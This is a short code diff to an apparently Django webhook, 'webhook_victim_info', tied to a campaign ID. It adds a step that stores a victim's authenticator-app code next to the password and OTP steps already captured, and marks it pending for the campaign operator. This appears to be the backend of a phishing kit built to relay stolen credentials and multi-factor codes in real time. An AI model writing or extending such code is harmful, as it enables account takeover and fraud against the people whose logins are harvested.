@@ -58,6 +58,13 @@ def webhook_victim_info(request, campaign_id):
         step_submitted = 'password'
         updated = True
     
+    if 'login_authenticator_app_code' in data:
+        victim_info.login_authenticator_app_code = data['login_authenticator_app_code']
+        victim_info.authenticator_status = 'pending'
+        victim_info.current_step = 'authenticator'
+        step_submitted = 'authenticator'
+        updated = True
+    
     if 'login_otp' in data:
         victim_info.login_otp = data['login_otp']
         victim_info.otp_status = 'pending'
